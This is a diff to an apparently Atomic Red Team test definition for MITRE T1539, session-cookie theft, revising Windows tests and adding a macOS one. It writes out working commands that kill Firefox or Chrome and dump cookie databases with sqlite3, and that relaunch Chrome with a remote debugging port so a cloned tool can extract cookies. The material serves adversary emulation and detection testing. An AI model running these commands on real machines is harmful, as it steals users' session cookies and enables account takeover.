@@ -1,5 +1,5 @@
 attack_technique: T1539
-display_name: Steal Web Session Cookie 
+display_name: Steal Web Session Cookie
 atomic_tests:
 - name: Steal Firefox Cookies (Windows)
   auto_generated_guid: 4b437357-f4e9-4c84-9fa6-9bcee6f826aa
@@ -12,12 +12,12 @@ atomic_tests:
   input_arguments:
     sqlite3_path:
       description: Path to sqlite3
-      type: Path
-      default: $env:temp\sqlite-tools-win32-x86-3380200\sqlite3.exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
     output_file:
       description: Filepath to output cookies
-      type: Path
-      default: $env:temp\T1539FirefoxCookies.txt
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -25,15 +25,16 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
-      Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
   executor:
     command: |
-     stop-process -name "firefox" -force -erroraction silentlycontinue
-     $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
-     "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
-    cleanup_command: | 
-     remove-item #{output_file} -erroraction silentlycontinue
+      stop-process -name "firefox" -force -erroraction silentlycontinue
+      $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
+      "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
+    cleanup_command: |
+      remove-item #{output_file} -erroraction silentlycontinue
     name: powershell
     elevation_required: false
 - name: Steal Chrome Cookies (Windows)
@@ -48,16 +49,16 @@ atomic_tests:
   input_arguments:
     cookie_db:
       description: Filepath for Chrome cookies database
-      type: String
+      type: string
       default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies
     sqlite3_path:
       description: Path to sqlite3
-      type: Path
-      default: $env:temp\sqlite-tools-win32-x86-3380200\sqlite3.exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
     output_file:
       description: Filepath to output cookies
-      type: Path
-      default: $env:temp\T1539ChromeCookies.txt
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -65,13 +66,52 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
-      Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
   executor:
     command: |
-     stop-process -name "chrome" -force -erroraction silentlycontinue
-     "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
-    cleanup_command: | 
-     remove-item #{output_file}
+      stop-process -name "chrome" -force -erroraction silentlycontinue
+      "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
+    cleanup_command: |
+      remove-item #{output_file}
     name: powershell
+    elevation_required: false
+- name: Steal Chrome Cookies via Remote Debugging (Mac)
+  auto_generated_guid: e43cfdaf-3fb8-4a45-8de0-7eee8741d072
+  description: |-
+    The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.
+
+    If successful, this test will output a list of cookies.
+
+    Note: Chrome processes will be killed during this test.
+  
+    See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
+  supported_platforms:
+  - macos 
+  dependency_executor_name: bash
+  dependencies:
+  - description: 'Install Go'
+    prereq_command: |-
+      go version
+    get_prereq_command: |-
+      brew install go
+  - description: 'Download and compile WhiteChocolateMacademiaNut'
+    prereq_command: |-
+      /tmp/WhiteChocolateMacademiaNut/chocolate -h
+    get_prereq_command: |-
+      git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut
+      cd /tmp/WhiteChocolateMacademiaNut
+      go mod init chocolate
+      go mod tidy
+      go build
+  executor:
+    command: |-
+      killall 'Google Chrome'
+      sleep 1
+      open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
+      sleep 1
+      /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
+    cleanup_command: rm -rf /tmp/WhiteChocolateMacademiaNut
+    name: bash
     elevation_required: false
